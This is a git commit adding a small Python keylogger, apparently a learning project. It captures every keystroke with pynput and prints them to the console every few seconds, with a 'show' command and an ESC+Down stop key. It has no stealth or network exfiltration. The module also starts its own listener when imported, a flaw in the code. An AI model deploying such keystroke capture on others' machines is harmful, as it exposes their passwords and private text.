aca4ab491bb669a24f2c1c1fd709d9f6d8e32cf6
Yehouda-12 <coheny748@gmail.com>
2025-06-18 17:48:28 +0300

    New

---
+++ YehoudaKey/main.py
@@ -0,0 +1,11 @@
+from pynput.keyboard import Listener
+import threading
+
+from KeyLogger.YehoudaKey.youdakey import on_press,log_by_minute
+
+log_thread = threading.Thread(target=log_by_minute)
+log_thread.start()
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
---
+++ YehoudaKey/youdakey.py
@@ -0,0 +1,92 @@
+from datetime import datetime
+from pynput.keyboard import Listener,Key
+import time
+import threading
+
+pressed_keys = set()
+last_keys=[]
+keys_all_time=[]
+keys_for_logging = []
+stop_logging= False
+last_show_index=0
+
+
+def on_press(key):
+    global stop_logging, last_show_index
+    pressed_keys.add(key)
+
+
+    if Key.esc in pressed_keys and Key.down in pressed_keys:
+        print(" ESC + Down pressed — stopping program.")
+        stop_logging = True
+        return False
+
+    try:
+        char = key.char
+    except AttributeError:
+
+
+        if key == Key.space:
+            char = ' '
+        elif key == Key.enter:
+
+            char = '\n'
+            if ''.join(last_keys).lower() == "show":
+                print("All keys typed since the last command")
+
+                print(''.join(keys_all_time[last_show_index:]))
+
+                last_show_index = len(keys_all_time)
+            last_keys.clear()
+            char='\n'
+
+        elif key == Key.tab:
+            char = '\t'
+        elif key == Key.backspace:
+            char = '⌫'
+
+        else:
+            char = f'[{str(key).replace("Key.", "")}]'
+
+    keys_all_time.append(char)
+    keys_for_logging.append(char)
+    if len(char) == 1 and char.isalpha():
+        last_keys.append(char)
+        if len(last_keys) > 10:
+            last_keys.pop(0)
+
+
+    elif char in [' ', '\n', '\t']:
+        last_keys.clear()
+
+
+
+
+def log_by_minute():
+    while not stop_logging:
+        keys = keys_for_logging.copy()
+        keys_for_logging.clear()  #מרוקן
+
+        now = datetime.now().strftime("%Y-%m-%d %H:%M")
+        print(f"\n**** {now} ****")
+        if keys:
+            print( ''.join(keys))
+
+        else:
+            print("No Key Pressed")
+        check_interval = 0.1
+        for _ in range(int(10 / check_interval)):
+            if stop_logging:
+                return
+            time.sleep(check_interval)
+log_thread = threading.Thread(target=log_by_minute)
+log_thread.start()
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
+
+
+
